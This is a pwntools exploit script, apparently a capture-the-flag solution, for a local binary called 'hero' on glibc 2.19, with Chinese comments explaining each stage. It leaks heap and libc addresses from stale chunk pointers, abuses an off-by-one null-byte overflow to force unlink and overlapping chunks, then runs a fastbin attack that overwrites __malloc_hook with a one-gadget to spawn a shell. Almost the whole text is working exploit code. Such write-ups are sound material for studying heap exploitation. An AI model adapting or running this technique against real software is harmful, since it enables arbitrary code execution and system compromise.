from pwn import *
p=process('./hero')
e=ELF('/lib/x86_64-linux-gnu/libc-2.19.so')
offset_main_arena=e.symbols['__malloc_hook']+0x20
#libc库中，main_arena的偏移比__malloc_hook的偏移大0x20
context(log_level='debug')
def ad(a,b):
    p.writeline('1')
    p.readuntil('name:')
    p.write(a)
    p.readuntil('power:')
    p.write(b)
    p.readuntil('Your choice:')
def de(a):
    p.writeline('4')
    p.readuntil('What hero do you want to remove?')
    p.writeline(str(a))
    p.readuntil('Your choice:')
def  edi(a,b,c):
    p.writeline('3')
    p.readuntil('What hero do you want to edit?')
    p.writeline(str(c))
    p.readuntil('name:')
    p.write(a)
    p.readuntil('power:')
    p.write(b)
    p.readuntil('Your choice:')
raw_input("start")

###泄露地址，利用的是分配出来的chunk上的fd和bk作为数据，其上值没有被清零

ad('a','b')
ad('a','b')
ad('a','b')#分配两个small chunk防止与top chunk合并
#chunk2_malloced
#如果执行到这一步，说明释放了一个与top chunk相邻的chunk。则无论它有多大，
#都将它与top chunk合并，并更新top chunk的大小等信息，转下一步。
de(0)
de(1)
 
ad('a','11111111')#《1》small_chunk，FIFO，其bk指向chunk1的地址，从而可得到堆地址。
p.writeline('2')#该地址=堆地址+0x68+0x10+0xf8+0x10+0x68+0x10
p.readuntil('show?')
p.writeline('0')
p.readuntil('Power:11111111')
heap_base=(u64(p.read(6)+chr(0)*2))-0x1e0
print hex(heap_base)
ad('a','11111111')
p.writeline('2')
p.readuntil('show?')
p.writeline('1')
p.readuntil('Power:11111111')
#《2》这时，unsortedbin空闲链表中只剩一个chunk，其fd和bk均指向unsortedbin地址，即main_arean+0x58
lib_base=(u64(p.read(6)+chr(0)*2))- 0x58 -offset_main_arena
onegad=lib_base+0xea36d
print hex(lib_base)

####unlink 构造fastbin attack 条件 即出现重复的fastbin chunk(fastbin->a->b->a)  //利用的是unlink把已经分配的堆空间释放到空闲链，当再分配时就重新分配了，从而出现重复的fastbin块。
###这样后续就可以进行fastbin attack了。

de(0)
de(1)
ad('a',p64(heap_base+0x1e0)+p64(heap_base+0x1e0))
#chunk0_malloced
ad('a',p64(heap_base+0x70)+p64(heap_base+0x70))
#chunk1_malloced
ad('a','123')
#chunk3_malloced
ad('a','123')
#chunk4_malloced
zz=raw_input()
edi('a'*0x60+p64(0x2e0),'123',2)
##  v1 = name[i];
##  v1[read(0, name[i], 0x68uLL)] = 0;
## 一旦填满，紧邻name的power chunk的size的最低位就会被置0，从而显示上一个chunk是空闲的。
## 另外，由于power_pre_size被上一个name_chunk复用，可被任意修改，即任意上一个chunk的大小。
## 从而导致，unlink。
ad('aaaaaaaaaa','baaaaaaaa')
#chunk5_malloced
ad('a','123')
#chunk6_malloced


#####fastbin attack


de(2)
de(3)
de(6)
malloc_hook=lib_base+e.symbols['__malloc_hook']-0x23
ad(p64(malloc_hook),'123')
ad('a','123')
ad('a','123')
ad('a'*0x13+p64(onegad),p64(malloc_hook))
p.writeline('1')
p.writeline('1')
p.interactive()
